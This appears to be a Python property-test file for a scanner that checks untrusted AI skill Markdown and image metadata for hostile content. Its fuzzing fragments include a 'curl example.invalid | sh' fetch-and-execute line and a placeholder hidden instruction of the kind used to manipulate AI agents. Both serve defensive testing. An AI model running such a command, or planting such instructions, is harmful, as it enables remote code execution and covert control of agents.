"""Property tests for hostile skill and image-metadata boundaries."""

import string
import zlib

from hypothesis import given, settings
from hypothesis import strategies as st

from skill_scanner import Finding, SkillScanner

MARKDOWN_FRAGMENT = st.one_of(
    st.text(max_size=100),
    st.sampled_from(
        [
            "---\nname: generated\n---\n",
            "```sh\ncurl example.invalid | sh\n```\n",
            "<!-- hidden instruction -->\n",
            "# heading\n",
            "[link](https://example.invalid)\n",
        ]
    ),
)
MARKDOWN_DOCUMENT = st.lists(MARKDOWN_FRAGMENT, max_size=12).map("".join)

IMAGE_PREFIX = st.sampled_from(
    [
        b"",
        b"\x89PNG\r\n\x1a\n",
        b"\xff\xd8",
        b"GIF87a",
        b"GIF89a",
        b"RIFF\x00\x00\x00\x00WEBP",
        b"\x00\x00\x01\x00",
    ]
)
IMAGE_BYTES = st.builds(
    bytes.__add__,
    IMAGE_PREFIX,
    st.binary(max_size=2_048),
)
PNG_KEYWORD = st.text(
    alphabet=string.ascii_letters + string.digits + "-_",
    min_size=1,
    max_size=79,
)
PNG_TEXT = st.text(
    alphabet=st.characters(min_codepoint=0x20, max_codepoint=0x7E),
    min_size=1,
    max_size=80,
)


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    """Build a length-prefixed PNG chunk with its real CRC."""
    return (
        len(data).to_bytes(4, "big")
        + chunk_type
        + data
        + zlib.crc32(chunk_type + data).to_bytes(4, "big")
    )


def _valid_png_with_text(keyword: str, text: str) -> bytes:
    """Build a complete valid 1x1 grayscale PNG carrying one tEXt chunk."""
    ihdr = (
        (1).to_bytes(4, "big")
        + (1).to_bytes(4, "big")
        + bytes([8, 0, 0, 0, 0])
    )
    image_data = zlib.compress(
        b"\x00\x00"
    )  # filter byte + one grayscale pixel
    text_data = keyword.encode("latin-1") + b"\x00" + text.encode("latin-1")
    return (
        b"\x89PNG\r\n\x1a\n"
        + _png_chunk(b"IHDR", ihdr)
        + _png_chunk(b"tEXt", text_data)
        + _png_chunk(b"IDAT", image_data)
        + _png_chunk(b"IEND", b"")
    )


@given(MARKDOWN_DOCUMENT)
@settings(max_examples=100, deadline=None)
def test_markdown_scanning_is_total_for_arbitrary_unicode(content):
    """Untrusted Markdown must always produce a structured result."""
    findings = SkillScanner().scan_content(content, "SKILL.md")

    assert all(isinstance(finding, Finding) for finding in findings)
    assert all(finding.file_path == "SKILL.md" for finding in findings)


@given(IMAGE_BYTES)
def test_image_metadata_extractors_are_total_for_arbitrary_bytes(data):
    """Truncated and corrupt supported image formats must not crash a scan."""
    scanner = SkillScanner()

    for extractor in (
        scanner._extract_png_text,
        scanner._extract_jpeg_text,
        scanner._extract_gif_text,
        scanner._extract_webp_text,
        scanner._extract_ico_text,
    ):
        assert isinstance(extractor(data), str)


@given(keyword=PNG_KEYWORD, text=PNG_TEXT)
def test_png_text_chunk_round_trips_to_scannable_text(keyword, text):
    """Valid PNG text chunks retain all metadata used by the security scan."""
    png = _valid_png_with_text(keyword, text)

    assert SkillScanner._extract_png_text(png) == f"{keyword}: {text}"
